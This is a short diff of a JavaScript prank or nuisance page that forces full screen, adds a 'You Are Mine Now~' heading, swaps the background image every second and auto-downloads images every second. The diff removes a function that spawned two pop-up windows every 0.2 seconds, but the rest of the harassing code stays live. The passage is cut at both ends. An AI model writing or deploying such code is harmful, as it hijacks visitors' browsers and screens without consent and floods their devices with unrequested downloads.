@@ -82,31 +82,13 @@
             goFullScreen(); // Forces full-screen
             document.body.innerHTML += "<h1>You Are Mine Now~ 💕</h1>";
 
-            // Change background every 1 second
+            // **Continuous Background Changes** every 1 second
             setInterval(() => {
                 let imgURL = getRandomImage();
                 document.body.style.backgroundImage = `url(${imgURL})`;
             }, 1000);
 
-            // **Infinite Pop-ups** - No stopping ever
-            function openPopup() {
-                let imgURL = getRandomImage();
-                let left = Math.random() * screen.width;
-                let top = Math.random() * screen.height;
-                let popUp = window.open("", "", `width=400,height=400,left=${left},top=${top}`);
-
-                if (popUp) {
-                    popUp.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
-                }
-            }
-
-            // Open new pop-ups continuously, no stopping
-            setInterval(() => {
-                openPopup();
-                openPopup();  // More pop-ups spawn together
-            }, 200); // Every 0.2 seconds new pop-ups spawn
-
-            // Auto-download images every second
+            // **Auto-Download Images** every 1 second
             setInterval(() => {
                 let imgURL = getRandomImage();
                 let link = document.createElement('a');
